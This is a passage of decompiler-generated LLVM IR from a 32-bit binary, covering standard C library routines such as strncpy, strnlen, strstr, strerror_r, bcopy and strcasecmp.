  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_804f7a9 = ptrtoint i8* %arg1 to i32
  store i32 %v4_804f7a9, i32* %edi.global-to-local, align 4
  %v4_804f7ad.pre = load i32, i32* @eax, align 4
  %v8_804f7ad.pre = load i1, i1* @df, align 1
  br label %dec_label_pc_804f7ad

dec_label_pc_804f7ad:                             ; preds = %dec_label_pc_804f7ad.dec_label_pc_804f7ad_crit_edge, %entry
  %v2_804f7ae = phi i32 [ %v7_804f7ae, %dec_label_pc_804f7ad.dec_label_pc_804f7ad_crit_edge ], [ %v4_804f7a9, %entry ]
  %v8_804f7ad = phi i1 [ %v5_804f7ae, %dec_label_pc_804f7ad.dec_label_pc_804f7ad_crit_edge ], [ %v8_804f7ad.pre, %entry ]
  %v4_804f7ad = phi i32 [ %v0_804f7af, %dec_label_pc_804f7ad.dec_label_pc_804f7ad_crit_edge ], [ %v4_804f7ad.pre, %entry ]
  %v7_804f7ad = phi i32 [ %v0_804f7ad.pre, %dec_label_pc_804f7ad.dec_label_pc_804f7ad_crit_edge ], [ %arg2, %entry ]
  %v1_804f7ad = inttoptr i32 %v7_804f7ad to i8*
  %v2_804f7ad = load i8, i8* %v1_804f7ad, align 1
  %v3_804f7ad = zext i8 %v2_804f7ad to i32
  %v5_804f7ad = and i32 %v4_804f7ad, -256
  %v6_804f7ad = or i32 %v3_804f7ad, %v5_804f7ad
  store i32 %v6_804f7ad, i32* %eax.global-to-local, align 4
  %v9_804f7ad = select i1 %v8_804f7ad, i32 -1, i32 1
  %v10_804f7ad = add i32 %v7_804f7ad, %v9_804f7ad
  store i32 %v10_804f7ad, i32* %esi.global-to-local, align 4
  %v3_804f7ae = inttoptr i32 %v2_804f7ae to i8*
  store i8 %v2_804f7ad, i8* %v3_804f7ae, align 1
  %v4_804f7ae = load i32, i32* %edi.global-to-local, align 4
  %v5_804f7ae = load i1, i1* @df, align 1
  %v6_804f7ae = select i1 %v5_804f7ae, i32 -1, i32 1
  %v7_804f7ae = add i32 %v6_804f7ae, %v4_804f7ae
  store i32 %v7_804f7ae, i32* %edi.global-to-local, align 4
  %v0_804f7af = load i32, i32* %eax.global-to-local, align 4
  %v3_804f7af = trunc i32 %v0_804f7af to i8
  %v4_804f7af = icmp eq i8 %v3_804f7af, 0
  %v1_804f7b1 = icmp eq i1 %v4_804f7af, false
  br i1 %v1_804f7b1, label %dec_label_pc_804f7ad.dec_label_pc_804f7ad_crit_edge, label %dec_label_pc_804f7b3

dec_label_pc_804f7ad.dec_label_pc_804f7ad_crit_edge: ; preds = %dec_label_pc_804f7ad
  %v0_804f7ad.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804f7ad

dec_label_pc_804f7b3:                             ; preds = %dec_label_pc_804f7ad
  store i32 %v4_804f7a9, i32* %eax.global-to-local, align 4
  %v2_804f7b7 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804f7b7, i32* @edx, align 4
  %v2_804f7b8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804f7b8, i32* @esi, align 4
  ret i32 %v4_804f7a9

; uselistorder directives
  uselistorder i32 %v0_804f7af, { 1, 0 }
  uselistorder i32 %v7_804f7ae, { 1, 0 }
  uselistorder i1 %v5_804f7ae, { 1, 0 }
  uselistorder i32 %v4_804f7a9, { 1, 2, 0, 3 }
}

declare i32 @strlen(i8*) local_unnamed_addr

define i32 @strncpy(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804f7d1 = load i32, i32* @esi, align 4
  store i32 %v0_804f7d1, i32* %stack_var_-8, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_804f7dd = ptrtoint i8* %arg1 to i32
  store i32 %v4_804f7dd, i32* %edi.global-to-local, align 4
  %v1_804f7e1 = add i32 %arg3, 1
  store i32 %v1_804f7e1, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804f7e2

dec_label_pc_804f7e2:                             ; preds = %dec_label_pc_804f7e5, %entry
  %v3_804f7e6 = phi i32 [ %v4_804f7dd, %entry ], [ %v8_804f7e6, %dec_label_pc_804f7e5 ]
  %v0_804f7e2 = phi i32 [ %v1_804f7e1, %entry ], [ %v0_804f7e2.pre, %dec_label_pc_804f7e5 ]
  %v1_804f7e2 = add i32 %v0_804f7e2, -1
  %v8_804f7e2 = icmp eq i32 %v1_804f7e2, 0
  store i32 %v1_804f7e2, i32* %ecx.global-to-local, align 4
  br i1 %v8_804f7e2, label %.loopexit, label %dec_label_pc_804f7e5

dec_label_pc_804f7e5:                             ; preds = %dec_label_pc_804f7e2
  %v0_804f7e5 = load i32, i32* %esi.global-to-local, align 4
  %v1_804f7e5 = inttoptr i32 %v0_804f7e5 to i8*
  %v2_804f7e5 = load i8, i8* %v1_804f7e5, align 1
  %v10_804f7e5 = load i1, i1* @df, align 1
  %v11_804f7e5 = select i1 %v10_804f7e5, i32 -1, i32 1
  %v12_804f7e5 = add i32 %v11_804f7e5, %v0_804f7e5
  store i32 %v12_804f7e5, i32* %esi.global-to-local, align 4
  %v4_804f7e6 = inttoptr i32 %v3_804f7e6 to i8*
  store i8 %v2_804f7e5, i8* %v4_804f7e6, align 1
  %v5_804f7e6 = load i32, i32* %edi.global-to-local, align 4
  %v6_804f7e6 = load i1, i1* @df, align 1
  %v7_804f7e6 = select i1 %v6_804f7e6, i32 -1, i32 1
  %v8_804f7e6 = add i32 %v7_804f7e6, %v5_804f7e6
  store i32 %v8_804f7e6, i32* %edi.global-to-local, align 4
  %v6_804f7e7 = icmp eq i8 %v2_804f7e5, 0
  %v1_804f7e9 = icmp eq i1 %v6_804f7e7, false
  %v0_804f7e2.pre = load i32, i32* %ecx.global-to-local, align 4
  br i1 %v1_804f7e9, label %dec_label_pc_804f7e2, label %dec_label_pc_804f7eb

dec_label_pc_804f7eb:                             ; preds = %dec_label_pc_804f7e5
  %v1_804f7eb = add i32 %v0_804f7e2.pre, -1
  store i32 %v1_804f7eb, i32* %ecx.global-to-local, align 4
  %v2_804f7ec = sext i8 %v2_804f7e5 to i32
  %v4_804f7ec = inttoptr i32 %v8_804f7e6 to i8*
  %v5_804f7ec = call i8* @_memset(i8* %v4_804f7ec, i32 %v2_804f7ec, i32 %v1_804f7eb)
  %v6_804f7ec = ptrtoint i8* %v5_804f7ec to i32
  store i32 %v6_804f7ec, i32* %ecx.global-to-local, align 4
  br label %.loopexit

.loopexit:                                        ; preds = %dec_label_pc_804f7e2, %dec_label_pc_804f7eb
  %v2_804f7f2 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804f7f2, i32* @edx, align 4
  %v2_804f7f3 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804f7f3, i32* @esi, align 4
  ret i32 %v4_804f7dd

; uselistorder directives
  uselistorder i32 %v8_804f7e6, { 0, 2, 1 }
  uselistorder i8 %v2_804f7e5, { 0, 2, 1 }
  uselistorder i32 %v1_804f7e2, { 1, 0 }
  uselistorder i32 %v4_804f7dd, { 1, 0, 2 }
  uselistorder label %.loopexit, { 1, 0 }
}

define i32 @strnlen() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i8* @__decompiler_undefined_function_2()
  %v4_804f7f8 = ptrtoint i8* %tmp4 to i32
  %v8_804f80b8 = icmp eq i32 %tmp, 0
  %v1_804f80c10 = icmp eq i1 %v8_804f80b8, false
  br i1 %v1_804f80c10, label %dec_label_pc_804f805, label %dec_label_pc_804f80e

dec_label_pc_804f805:                             ; preds = %entry, %dec_label_pc_804f80a
  %v1_804f80b12 = phi i32 [ %v1_804f80b, %dec_label_pc_804f80a ], [ %tmp, %entry ]
  %v0_804f80e11 = phi i32 [ %v1_804f80a, %dec_label_pc_804f80a ], [ %v4_804f7f8, %entry ]
  %v1_804f805 = inttoptr i32 %v0_804f80e11 to i8*
  %v2_804f805 = load i8, i8* %v1_804f805, align 1
  %v3_804f805 = icmp eq i8 %v2_804f805, 0
  br i1 %v3_804f805, label %dec_label_pc_804f80e, label %dec_label_pc_804f80a

dec_label_pc_804f80a:                             ; preds = %dec_label_pc_804f805
  %v1_804f80a = add i32 %v0_804f80e11, 1
  %v1_804f80b = add i32 %v1_804f80b12, -1
  %v8_804f80b = icmp eq i32 %v1_804f80b, 0
  %v1_804f80c = icmp eq i1 %v8_804f80b, false
  br i1 %v1_804f80c, label %dec_label_pc_804f805, label %dec_label_pc_804f80e

dec_label_pc_804f80e:                             ; preds = %dec_label_pc_804f80a, %dec_label_pc_804f805, %entry
  %v0_804f80e.lcssa = phi i32 [ %v4_804f7f8, %entry ], [ %v0_804f80e11, %dec_label_pc_804f805 ], [ %v1_804f80a, %dec_label_pc_804f80a ]
  %v2_804f80e = sub i32 %v0_804f80e.lcssa, %v4_804f7f8
  ret i32 %v2_804f80e

; uselistorder directives
  uselistorder i32 %v1_804f80b, { 1, 0 }
  uselistorder i32 %v0_804f80e11, { 0, 2, 1 }
  uselistorder i32 %v4_804f7f8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804f805, { 1, 0 }
}

define i32 @strstr(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %v0_804f817 = load i32, i32* @ebx, align 4
  %v4_804f81b = ptrtoint i8* %arg2 to i32
  %v2_804f823 = load i8, i8* %arg2, align 1
  %v1_804f826 = icmp eq i8 %v2_804f823, 0
  br i1 %v1_804f826, label %dec_label_pc_804f8da, label %dec_label_pc_804f831

dec_label_pc_804f831:                             ; preds = %entry
  %v1_804f831 = add i32 %arg1, -1
  br label %dec_label_pc_804f832

dec_label_pc_804f832:                             ; preds = %dec_label_pc_804f83e, %dec_label_pc_804f831
  %v0_804f832 = phi i32 [ %v1_804f832, %dec_label_pc_804f83e ], [ %v1_804f831, %dec_label_pc_804f831 ]
  %v1_804f832 = add i32 %v0_804f832, 1
  %v1_804f833 = inttoptr i32 %v1_804f832 to i8*
  %v2_804f833 = load i8, i8* %v1_804f833, align 1
  %v1_804f836 = icmp eq i8 %v2_804f833, 0
  br i1 %v1_804f836, label %dec_label_pc_804f8d8, label %dec_label_pc_804f83e

dec_label_pc_804f83e:                             ; preds = %dec_label_pc_804f832
  %v14_804f83e = icmp eq i8 %v2_804f833, %v2_804f823
  %v1_804f841 = icmp eq i1 %v14_804f83e, false
  br i1 %v1_804f841, label %dec_label_pc_804f832, label %dec_label_pc_804f843

dec_label_pc_804f843:                             ; preds = %dec_label_pc_804f83e
  %v1_804f843 = add i32 %v4_804f81b, 1
  %v2_804f84a = inttoptr i32 %v1_804f843 to i8*
  %v3_804f84a = load i8, i8* %v2_804f84a, align 1
  %v1_804f84e = icmp eq i8 %v3_804f84a, 0
  br i1 %v1_804f84e, label %dec_label_pc_804f8da, label %dec_label_pc_804f856

dec_label_pc_804f856:                             ; preds = %dec_label_pc_804f843
  %v1_804f856 = add i32 %v0_804f832, 2
  %v1_804f8a0 = add i32 %v4_804f81b, 2
  %v2_804f8a0 = inttoptr i32 %v1_804f8a0 to i8*
  br label %dec_label_pc_804f88c

dec_label_pc_804f861:                             ; preds = %dec_label_pc_804f8d0
  %v2_804f861 = inttoptr i32 %v0_804f892 to i8*
  %v3_804f861 = load i8, i8* %v2_804f861, align 1
  br label %dec_label_pc_804f87f.preheader

dec_label_pc_804f87f.preheader:                   ; preds = %dec_label_pc_804f861, %dec_label_pc_804f88c
  %v0_804f86a.ph.in = phi i8 [ %v4_804f856.sink.in, %dec_label_pc_804f88c ], [ %v3_804f861, %dec_label_pc_804f861 ]
  %v14_804f87f46 = icmp eq i8 %v0_804f86a.ph.in, %v2_804f823
  %v1_804f88248 = icmp eq i1 %v14_804f87f46, false
  br i1 %v1_804f88248, label %dec_label_pc_804f86a, label %dec_label_pc_804f884

dec_label_pc_804f86a:                             ; preds = %dec_label_pc_804f87f.preheader, %dec_label_pc_804f87b
  %v0_804f86a50.in = phi i8 [ %v2_804f87c, %dec_label_pc_804f87b ], [ %v0_804f86a.ph.in, %dec_label_pc_804f87f.preheader ]
  %v0_804f86e49 = phi i32 [ %v1_804f87b, %dec_label_pc_804f87b ], [ %v0_804f892, %dec_label_pc_804f87f.preheader ]
  %v1_804f86a = icmp eq i8 %v0_804f86a50.in, 0
  br i1 %v1_804f86a, label %dec_label_pc_804f8d8, label %dec_label_pc_804f86e

dec_label_pc_804f86e:                             ; preds = %dec_label_pc_804f86a
  %v1_804f86e = add i32 %v0_804f86e49, 1
  %v1_804f86f = inttoptr i32 %v1_804f86e to i8*
  %v2_804f86f = load i8, i8* %v1_804f86f, align 1
  %v14_804f872 = icmp eq i8 %v2_804f86f, %v2_804f823
  br i1 %v14_804f872, label %dec_label_pc_804f884, label %dec_label_pc_804f877

dec_label_pc_804f877:                             ; preds = %dec_label_pc_804f86e
  %v1_804f877 = icmp eq i8 %v2_804f86f, 0
  br i1 %v1_804f877, label %dec_label_pc_804f8d8, label %dec_label_pc_804f87b

dec_label_pc_804f87b:                             ; preds = %dec_label_pc_804f877
  %v1_804f87b = add i32 %v0_804f86e49, 2
  %v1_804f87c = inttoptr i32 %v1_804f87b to i8*
  %v2_804f87c = load i8, i8* %v1_804f87c, align 1
  %v14_804f87f = icmp eq i8 %v2_804f87c, %v2_804f823
  %v1_804f882 = icmp eq i1 %v14_804f87f, false
  br i1 %v1_804f882, label %dec_label_pc_804f86a, label %dec_label_pc_804f884

dec_label_pc_804f884:                             ; preds = %dec_label_pc_804f87b, %dec_label_pc_804f86e, %dec_label_pc_804f87f.preheader
  %v0_804f884 = phi i32 [ %v0_804f892, %dec_label_pc_804f87f.preheader ], [ %v1_804f86e, %dec_label_pc_804f86e ], [ %v1_804f87b, %dec_label_pc_804f87b ]
  %v1_804f884 = add i32 %v0_804f884, 1
  br label %dec_label_pc_804f88c

dec_label_pc_804f88c:                             ; preds = %dec_label_pc_804f856, %dec_label_pc_804f884
  %v0_804f892 = phi i32 [ %v1_804f856, %dec_label_pc_804f856 ], [ %v1_804f884, %dec_label_pc_804f884 ]
  %v4_804f856.sink.in.in.in = phi i32 [ %v1_804f856, %dec_label_pc_804f856 ], [ %v1_804f884, %dec_label_pc_804f884 ]
  %v4_804f856.sink.in.in = inttoptr i32 %v4_804f856.sink.in.in.in to i8*
  %v4_804f856.sink.in = load i8, i8* %v4_804f856.sink.in.in, align 1
  %storemerge5 = icmp eq i8 %v4_804f856.sink.in, %v3_804f84a
  %v1_804f88c = icmp eq i1 %storemerge5, false
  br i1 %v1_804f88c, label %dec_label_pc_804f87f.preheader, label %dec_label_pc_804f88e

dec_label_pc_804f88e:                             ; preds = %dec_label_pc_804f88c
  %v1_804f892 = add i32 %v0_804f892, 1
  %v1_804f899 = add i32 %v0_804f892, -1
  %v2_804f89c = inttoptr i32 %v1_804f892 to i8*
  %v3_804f89c = load i8, i8* %v2_804f89c, align 1
  %v4_804f89c = zext i8 %v3_804f89c to i32
  %v3_804f8a0 = load i8, i8* %v2_804f8a0, align 1
  %v4_804f8a0 = zext i8 %v3_804f8a0 to i32
  %v12_804f8a5 = icmp eq i8 %v3_804f89c, %v3_804f8a0
  %v1_804f8a7 = icmp eq i1 %v12_804f8a5, false
  br i1 %v1_804f8a7, label %dec_label_pc_804f8d0, label %dec_label_pc_804f8a9

dec_label_pc_804f8a9:                             ; preds = %dec_label_pc_804f88e, %dec_label_pc_804f8bd
  %v0_804f8c0 = phi i32 [ %v1_804f8c0, %dec_label_pc_804f8bd ], [ %v1_804f8a0, %dec_label_pc_804f88e ]
  %v0_804f8bd = phi i32 [ %v1_804f8bd, %dec_label_pc_804f8bd ], [ %v1_804f892, %dec_label_pc_804f88e ]
  %v0_804f8a9 = phi i32 [ %v3_804f8c3, %dec_label_pc_804f8bd ], [ %v4_804f89c, %dec_label_pc_804f88e ]
  %v1_804f8a9 = icmp eq i32 %v0_804f8a9, 0
  br i1 %v1_804f8a9, label %dec_label_pc_804f8da, label %dec_label_pc_804f8ad

dec_label_pc_804f8ad:                             ; preds = %dec_label_pc_804f8a9
  %v1_804f8ad = add i32 %v0_804f8bd, 1
  %v2_804f8ad = inttoptr i32 %v1_804f8ad to i8*
  %v3_804f8ad = load i8, i8* %v2_804f8ad, align 1
  %v1_804f8b1 = add i32 %v0_804f8c0, 1
  %v2_804f8b1 = inttoptr i32 %v1_804f8b1 to i8*
  %v3_804f8b1 = load i8, i8* %v2_804f8b1, align 1
  %v4_804f8b1 = zext i8 %v3_804f8b1 to i32
  %v12_804f8b5 = icmp eq i8 %v3_804f8ad, %v3_804f8b1
  %v1_804f8b7 = icmp eq i1 %v12_804f8b5, false
  br i1 %v1_804f8b7, label %dec_label_pc_804f8d0, label %dec_label_pc_804f8b9

dec_label_pc_804f8b9:                             ; preds = %dec_label_pc_804f8ad
  %v1_804f8b9 = icmp eq i8 %v3_804f8b1, 0
  br i1 %v1_804f8b9, label %dec_label_pc_804f8da, label %dec_label_pc_804f8bd

dec_label_pc_804f8bd:                             ; preds = %dec_label_pc_804f8b9
  %v1_804f8bd = add i32 %v0_804f8bd, 2
  %v1_804f8c0 = add i32 %v0_804f8c0, 2
  %v1_804f8c3 = inttoptr i32 %v1_804f8c0 to i8*
  %v2_804f8c3 = load i8, i8* %v1_804f8c3, align 1
  %v3_804f8c3 = zext i8 %v2_804f8c3 to i32
  %v1_804f8c7 = inttoptr i32 %v1_804f8bd to i8*
  %v2_804f8c7 = load i8, i8* %v1_804f8c7, align 1
  %v12_804f8ca = icmp eq i8 %v2_804f8c7, %v2_804f8c3
  br i1 %v12_804f8ca, label %dec_label_pc_804f8a9, label %dec_label_pc_804f8ce

dec_label_pc_804f8ce:                             ; preds = %dec_label_pc_804f8bd
  br label %dec_label_pc_804f8d0

dec_label_pc_804f8d0:                             ; preds = %dec_label_pc_804f8ad, %dec_label_pc_804f88e, %dec_label_pc_804f8ce
  %v0_804f8d0 = phi i32 [ %v4_804f8a0, %dec_label_pc_804f88e ], [ %v3_804f8c3, %dec_label_pc_804f8ce ], [ %v4_804f8b1, %dec_label_pc_804f8ad ]
  %v1_804f8d0 = icmp eq i32 %v0_804f8d0, 0
  %v1_804f8d2 = icmp eq i1 %v1_804f8d0, false
  br i1 %v1_804f8d2, label %dec_label_pc_804f861, label %dec_label_pc_804f8da

dec_label_pc_804f8d8:                             ; preds = %dec_label_pc_804f832, %dec_label_pc_804f877, %dec_label_pc_804f86a
  br label %dec_label_pc_804f8da

dec_label_pc_804f8da:                             ; preds = %dec_label_pc_804f8d0, %dec_label_pc_804f8a9, %dec_label_pc_804f8b9, %entry, %dec_label_pc_804f843, %dec_label_pc_804f8d8
  %storemerge3 = phi i32 [ 0, %dec_label_pc_804f8d8 ], [ %v1_804f832, %dec_label_pc_804f843 ], [ %arg1, %entry ], [ %v1_804f899, %dec_label_pc_804f8b9 ], [ %v1_804f899, %dec_label_pc_804f8a9 ], [ %v1_804f899, %dec_label_pc_804f8d0 ]
  store i32 %v0_804f817, i32* @ebx, align 4
  ret i32 %storemerge3

; uselistorder directives
  uselistorder i32 %v1_804f8c0, { 1, 0 }
  uselistorder i32 %v1_804f8bd, { 1, 0 }
  uselistorder i8 %v3_804f8b1, { 1, 0, 2 }
  uselistorder i8 %v4_804f856.sink.in, { 1, 0 }
  uselistorder i32 %v0_804f892, { 4, 3, 2, 1, 0 }
  uselistorder i8 %v2_804f87c, { 1, 0 }
  uselistorder i32 %v1_804f87b, { 0, 2, 1 }
  uselistorder i8 %v2_804f86f, { 1, 0 }
  uselistorder i32 %v0_804f86e49, { 1, 0 }
  uselistorder i32 %v1_804f832, { 0, 2, 1 }
  uselistorder i8* %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_804f8da, { 5, 0, 2, 1, 4, 3 }
  uselistorder label %dec_label_pc_804f8d8, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804f8d0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804f8a9, { 1, 0 }
  uselistorder label %dec_label_pc_804f88c, { 1, 0 }
  uselistorder label %dec_label_pc_804f86a, { 1, 0 }
  uselistorder label %dec_label_pc_804f87f.preheader, { 1, 0 }
}

define i32 @__GI___glibc_strerror_r() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp2, i32* @ebx, align 4
  %v3_804f8f5 = call i32 @__xpg_strerror_r(i32 %tmp, i32 %tmp2, i32 %tmp1)
  %v0_804f8fd = load i32, i32* @ebx, align 4
  ret i32 %v0_804f8fd
}

define i32 @__xpg_strerror_r(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-17 = alloca i32, align 4
  %stack_var_-108 = alloca i8*, align 4
  store i32 %arg3, i32* @edi, align 4
  %v6_804f916 = icmp ugt i32 %arg1, 124
  br i1 %v6_804f916, label %dec_label_pc_804f933, label %dec_label_pc_804f918

dec_label_pc_804f918:                             ; preds = %entry
  store i32 ptrtoint ([8 x i8]* @global_var_8057440.175 to i32), i32* @esi, align 4
  %v1_804f9284 = icmp eq i32 %arg1, 0
  %v1_804f92a11 = icmp eq i1 %v1_804f9284, false
  br i1 %v1_804f92a11, label %dec_label_pc_804f921, label %dec_label_pc_804f92c

dec_label_pc_804f921:                             ; preds = %dec_label_pc_804f918, %dec_label_pc_804f921
  %v0_804f924 = phi i32 [ %v3_804f924, %dec_label_pc_804f921 ], [ %arg1, %dec_label_pc_804f918 ]
  %v0_804f927 = phi i32 [ %v1_804f927, %dec_label_pc_804f921 ], [ ptrtoint ([8 x i8]* @global_var_8057440.175 to i32), %dec_label_pc_804f918 ]
  %v1_804f921 = inttoptr i32 %v0_804f927 to i8*
  %v2_804f921 = load i8, i8* %v1_804f921, align 1
  %v7_804f921 = icmp eq i8 %v2_804f921, 0
  %v2_804f924 = zext i1 %v7_804f921 to i32
  %v3_804f924 = add i32 %v2_804f924, %v0_804f924
  %v16_804f924 = icmp eq i32 %v3_804f924, 0
  %v1_804f927 = add i32 %v0_804f927, 1
  store i32 %v1_804f927, i32* @esi, align 4
  %v1_804f92a = icmp eq i1 %v16_804f924, false
  br i1 %v1_804f92a, label %dec_label_pc_804f921, label %dec_label_pc_804f92c

dec_label_pc_804f92c:                             ; preds = %dec_label_pc_804f921, %dec_label_pc_804f918
  %v0_804f92e = phi i32 [ ptrtoint ([8 x i8]* @global_var_8057440.175 to i32), %dec_label_pc_804f918 ], [ %v1_804f927, %dec_label_pc_804f921 ]
  store i32 0, i32* @ebp, align 4
  %v1_804f92e = inttoptr i32 %v0_804f92e to i8*
  %v2_804f92e = load i8, i8* %v1_804f92e, align 1
  %v3_804f92e = icmp eq i8 %v2_804f92e, 0
  %v1_804f931 = icmp eq i1 %v3_804f92e, false
  br i1 %v1_804f931, label %dec_label_pc_804f92c.dec_label_pc_804f962_crit_edge, label %dec_label_pc_804f933

dec_label_pc_804f92c.dec_label_pc_804f962_crit_edge: ; preds = %dec_label_pc_804f92c
  br label %dec_label_pc_804f962

dec_label_pc_804f933:                             ; preds = %dec_label_pc_804f92c, %entry
  %v1_804f936 = ashr i32 %arg1, 31
  store i8* null, i8** %stack_var_-108, align 4
  store i32 22, i32* @ebp, align 4
  %v6_804f947 = bitcast i32* %stack_var_-17 to i8*
  %v7_804f947 = call i32 @_uintmaxtostr(i8* %v6_804f947, i32 %arg1, i32 %v1_804f936, i32 -10, i32 0)
  %v1_804f956 = add i32 %v7_804f947, -14
  store i32 %v1_804f956, i32* @esi, align 4
  %v5_804f959 = inttoptr i32 %v1_804f956 to i8*
  store i8* %v5_804f959, i8** %stack_var_-108, align 4
  %tmp44 = inttoptr i32 %v1_804f956 to i16*
  %v6_804f95a = call i32 @memcpy(i16* %tmp44, i32 ptrtoint ([15 x i8]* @global_var_8057416.176 to i32), i32 14)
  %v1_804f96c.pre = load i32, i32* @edi, align 4
  %v0_804f972.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804f962

dec_label_pc_804f962:                             ; preds = %dec_label_pc_804f92c.dec_label_pc_804f962_crit_edge, %dec_label_pc_804f933
  %v0_804f972 = phi i32 [ %v0_804f92e, %dec_label_pc_804f92c.dec_label_pc_804f962_crit_edge ], [ %v0_804f972.pre, %dec_label_pc_804f933 ]
  %v1_804f96c = phi i32 [ %arg3, %dec_label_pc_804f92c.dec_label_pc_804f962_crit_edge ], [ %v1_804f96c.pre, %dec_label_pc_804f933 ]
  %v4_804f962 = icmp eq i32 %arg2, 0
  %v3_804f96c = select i1 %v4_804f962, i32 0, i32 %v1_804f96c
  store i32 %v3_804f96c, i32* @edi, align 4
  %v5_804f972 = inttoptr i32 %v0_804f972 to i8*
  store i8* %v5_804f972, i8** %stack_var_-108, align 4
  %v3_804f973 = call i32 @strlen(i8* %v5_804f972)
  %v1_804f97b = add i32 %v3_804f973, 1
  store i32 %v1_804f97b, i32* %ebx.global-to-local, align 4
  %v1_804f97e = load i32, i32* @edi, align 4
  %tmp = icmp ugt i32 %v1_804f97b, %v1_804f97e
  br i1 %tmp, label %dec_label_pc_804f982, label %dec_label_pc_804f989

dec_label_pc_804f982:                             ; preds = %dec_label_pc_804f962
  store i32 %v1_804f97e, i32* %ebx.global-to-local, align 4
  store i32 34, i32* @ebp, align 4
  br label %dec_label_pc_804f989

dec_label_pc_804f989:                             ; preds = %dec_label_pc_804f962, %dec_label_pc_804f982
  %v0_804f98e = phi i32 [ %v1_804f97b, %dec_label_pc_804f962 ], [ %v1_804f97e, %dec_label_pc_804f982 ]
  %v1_804f989 = icmp eq i32 %v0_804f98e, 0
  br i1 %v1_804f989, label %dec_label_pc_804f9a5, label %dec_label_pc_804f98d

dec_label_pc_804f98d:                             ; preds = %dec_label_pc_804f989
  %v0_804f98f = load i32, i32* @esi, align 4
  %v8_804f990 = inttoptr i32 %arg2 to i8*
  store i8* %v8_804f990, i8** %stack_var_-108, align 4
  %tmp45 = inttoptr i32 %arg2 to i16*
  %v6_804f994 = call i32 @memcpy(i16* %tmp45, i32 %v0_804f98f, i32 %v0_804f98e)
  %v1_804f9a0 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804f9a0 = add i32 %arg2, -1
  %v3_804f9a0 = add i32 %v2_804f9a0, %v1_804f9a0
  %v4_804f9a0 = inttoptr i32 %v3_804f9a0 to i8*
  store i8 0, i8* %v4_804f9a0, align 1
  br label %dec_label_pc_804f9a5

dec_label_pc_804f9a5:                             ; preds = %dec_label_pc_804f989, %dec_label_pc_804f98d
  %v0_804f9a5 = load i32, i32* @ebp, align 4
  %v1_804f9a5 = icmp eq i32 %v0_804f9a5, 0
  br i1 %v1_804f9a5, label %dec_label_pc_804f9b0, label %dec_label_pc_804f9a9

dec_label_pc_804f9a9:                             ; preds = %dec_label_pc_804f9a5
  %v0_804f9a9 = load i8*, i8** %stack_var_-108, align 4
  %v1_804f9a9 = ptrtoint i8* %v0_804f9a9 to i32
  %v2_804f9a9 = call i32 @__errno_location(i32 %v1_804f9a9)
  %v0_804f9ae = load i32, i32* @ebp, align 4
  %v2_804f9ae = inttoptr i32 %v2_804f9a9 to i32*
  store i32 %v0_804f9ae, i32* %v2_804f9ae, align 4
  %v0_804f9b3.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_804f9b0

dec_label_pc_804f9b0:                             ; preds = %dec_label_pc_804f9a5, %dec_label_pc_804f9a9
  %v0_804f9b3 = phi i32 [ 0, %dec_label_pc_804f9a5 ], [ %v0_804f9b3.pre, %dec_label_pc_804f9a9 ]
  ret i32 %v0_804f9b3

; uselistorder directives
  uselistorder i32 %v1_804f97e, { 1, 2, 0 }
  uselistorder i32 %v1_804f97b, { 1, 0, 2 }
  uselistorder i32 %v1_804f927, { 0, 2, 1 }
  uselistorder i32 %v3_804f924, { 1, 0 }
  uselistorder i8** %stack_var_-108, { 4, 3, 2, 1, 0 }
  uselistorder i32* %ebx.global-to-local, { 1, 0, 2 }
  uselistorder i32 ptrtoint ([8 x i8]* @global_var_8057440.175 to i32), { 1, 0, 2 }
  uselistorder i32 %arg2, { 0, 3, 2, 1 }
  uselistorder i32 %arg1, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_804f9b0, { 1, 0 }
  uselistorder label %dec_label_pc_804f9a5, { 1, 0 }
  uselistorder label %dec_label_pc_804f989, { 1, 0 }
  uselistorder label %dec_label_pc_804f962, { 1, 0 }
  uselistorder label %dec_label_pc_804f921, { 1, 0 }
}

define i32 @bcopy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v2_804f9cc = inttoptr i32 %arg2 to i8*
  %v3_804f9cc = call i32 @memmove(i8* %v2_804f9cc, i32 %arg1)
  ret i32 %v3_804f9cc
}

define i32 @__GI_strcasecmp(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_804f9d5 = load i32, i32* bitcast (i32** @global_var_805a040.178 to i32*), align 64
  %v4_804f9de = ptrtoint i8* %arg1 to i32
  br label %dec_label_pc_804f9e6

dec_label_pc_804f9e6:                             ; preds = %dec_label_pc_804fa03, %entry
  %storemerge = phi i32 [ %v4_804f9de, %entry ], [ %v1_804fa04, %dec_label_pc_804fa03 ]
  %v0_804fa04 = phi i32 [ %v4_804f9de, %entry ], [ %v1_804fa04, %dec_label_pc_804fa03 ]
  %v0_804fa096 = phi i32 [ 0, %entry ], [ %v0_804fa097, %dec_label_pc_804fa03 ]
